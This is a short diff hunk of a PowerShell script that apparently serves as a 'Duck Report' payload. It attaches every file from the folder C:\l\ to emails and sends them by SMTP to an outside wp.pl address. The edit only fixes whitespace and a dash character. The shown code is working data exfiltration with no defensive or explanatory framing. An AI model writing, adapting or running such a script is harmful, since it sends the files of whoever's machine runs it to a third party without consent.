@@ -8,10 +8,10 @@ $ReportEmail.To.Add('emaildotestowania1@wp.pl')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
 $files=Get-ChildItem "C:\l\"
-Foreach($file in $files)
+Foreach($file in $files) 
 {
 
-$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
+$attachment = New-Object System.Net.Mail.Attachment -ArgumentList C:\l\$file
 $ReportEmail.Attachments.Add($attachment)
 $SMTPInfo.Send($ReportEmail)
 }
